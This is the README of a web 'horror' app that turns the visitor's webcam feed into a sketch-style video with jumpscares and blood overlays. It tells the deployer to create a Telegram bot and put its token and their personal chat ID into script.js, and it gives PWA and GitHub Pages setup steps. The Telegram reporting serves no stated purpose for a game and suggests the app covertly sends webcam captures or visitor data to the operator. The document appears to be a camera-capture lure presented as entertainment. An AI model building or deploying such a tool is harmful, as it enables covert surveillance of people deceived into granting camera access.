## 👁️ Overview

**Realm of Darkness** is not your ordinary horror experience.  
It's a **web-based nightmare** built with HTML, CSS, and JavaScript — designed to creep under your skin and stay in your mind long after you close the tab.

This interactive horror web app transforms your webcam feed into a **haunting sketch-style video**, blending real-time effects with:

- 👻 Sudden **jumpscares** and scream sounds  
- 🩸 Realistic **blood drip overlays**  
- 🌑 Sinister **shadow figure sightings**  
- 🎭 Filter toggles like **invert, blur, and sketch**  
- 📱 **Mobile and desktop optimized**  
- ⚰️ **Horror-themed ending message** (No cheesy credits)

### Set up Telegram Bot

1. Open Telegram and search for `@BotFather`  
2. Create a bot, copy its token  
3. Start a chat with your bot, send any message, and note down your chat ID  
   - You can use `@userinfobot` to get your user ID  
4. Replace these lines (line no 4 and 5) in the script.js code:
```js
const BOT_TOKEN = "YOUR_BOT_TOKEN";
const CHAT_ID = "YOUR_CHAT_ID";
```
with your actual bot token and chat ID.

### Add Progressive Web App Support

✅ You already have `manifest.json` and `service-worker.js` in the root of this project.  
✅ In your `index.html`, make sure these lines are added inside the `<head>`:

```html
<link rel="manifest" href="manifest.json">
<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('service-worker.js')
      .then(reg => console.log('Service Worker registered:', reg))
      .catch(err => console.log('Service Worker registration failed:', err));
  }
</script>
```

✅ Make sure your icons (`Birthday Weather 192.png` and `Birthday Weather 512.png`) are present in the root directory and match the names in your manifest.  
✅ When you deploy on GitHub Pages, do a hard refresh (Ctrl+F5) to see the install prompt on supported browsers.

###  Run It Locally (Experimental)

- Open `index.html` in your browser   
- Allow camera
